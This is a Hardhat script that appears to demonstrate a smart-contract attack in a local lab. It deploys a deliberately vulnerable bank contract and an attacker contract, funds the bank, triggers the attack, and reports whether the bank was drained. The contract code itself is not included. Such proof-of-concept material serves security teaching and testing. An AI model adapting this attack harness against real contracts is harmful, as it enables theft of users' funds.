const { ethers } = require("hardhat");

async function main() {
  const [owner, attackerSigner] = await ethers.getSigners();

  // Deploy VulnerableBank
  const VulnerableBank = await ethers.getContractFactory("VulnerableBank");
  const vulnerableBank = await VulnerableBank.deploy();
  await vulnerableBank.waitForDeployment();
  const bankAddress = await vulnerableBank.getAddress();
  console.log(`VulnerableBank deployed to: ${bankAddress}`);

  // Deploy Attacker
  const Attacker = await ethers.getContractFactory("Attacker");
  const attackerContract = await Attacker.deploy(bankAddress);
  await attackerContract.waitForDeployment();
  const attackerAddress = await attackerContract.getAddress();
  console.log(`Attacker contract deployed to: ${attackerAddress}`);

  // Fund the VulnerableBank with 10 ETH from the owner
  console.log("Depositing 10 ETH into VulnerableBank...");
  const depositTx = await vulnerableBank.connect(owner).deposit({ value: ethers.parseEther("10.0") });
  await depositTx.wait();

  let bankBalance = await ethers.provider.getBalance(bankAddress);
  console.log(`Bank balance before attack: ${ethers.formatEther(bankBalance)} ETH`);

  // Start the attack
  console.log("Starting the attack from the Attacker contract...");
  const attackTx = await attackerContract.connect(attackerSigner).attack({ value: ethers.parseEther("1.0") });
  await attackTx.wait();

  // Check balances after the attack
  bankBalance = await ethers.provider.getBalance(bankAddress);
  const attackerBalance = await ethers.provider.getBalance(attackerAddress);

  console.log(`Bank balance after attack: ${ethers.formatEther(bankBalance)} ETH`);
  console.log(`Attacker contract balance after attack: ${ethers.formatEther(attackerBalance)} ETH`);

  if (bankBalance < ethers.parseEther("1.0")) {
    console.log("\n✅ Attack successful! The bank has been drained.");
  } else {
    console.log("\n❌ Attack failed.");
  }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
